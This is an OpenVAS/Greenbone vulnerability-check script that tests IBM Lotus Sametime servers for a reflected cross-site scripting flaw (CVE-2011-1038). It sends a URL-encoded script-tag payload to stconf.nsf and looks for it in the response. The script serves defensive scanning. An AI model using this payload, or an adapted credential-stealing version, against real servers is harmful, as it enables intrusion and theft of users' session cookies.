CPE = "cpe:/a:ibm:lotus_domino";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103084" );
	script_version( "2020-10-20T15:03:35+0000" );
	script_tag( name: "last_modification", value: "2020-10-20 15:03:35 +0000 (Tue, 20 Oct 2020)" );
	script_tag( name: "creation_date", value: "2011-02-22 13:26:53 +0100 (Tue, 22 Feb 2011)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_cve_id( "CVE-2011-1038" );
	script_bugtraq_id( 46471 );
	script_name( "IBM Lotus Sametime Server 'stconf.nsf' Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/46471" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/516563" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_hcl_domino_consolidation.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "hcl/domino/detected" );
	script_tag( name: "summary", value: "IBM Lotus Sametime Server is prone to a cross-site scripting
  vulnerability because it fails to sufficiently sanitize user-supplied data." );
	script_tag( name: "affected", value: "IBM Lotus Sametime 8.0.1 is vulnerable. Other versions may also
  be affected." );
	script_tag( name: "impact", value: "An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker
  to steal cookie-based authentication credentials and to launch other attacks." );
	script_tag( name: "solution", value: "Apply the patch for this vulnerability (8.0.1.0-Lotus-ST-IF-RPOH-8F7KAT),
  available from IBM Support and Downloads. See References." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/stconf.nsf/WebMessage?OpenView&messageString=%22;;%3E%3Cscript%3Ealert(%27vt-xss-test%27)%3C/script%3E";
if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\('vt-xss-test'\\)</script>", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

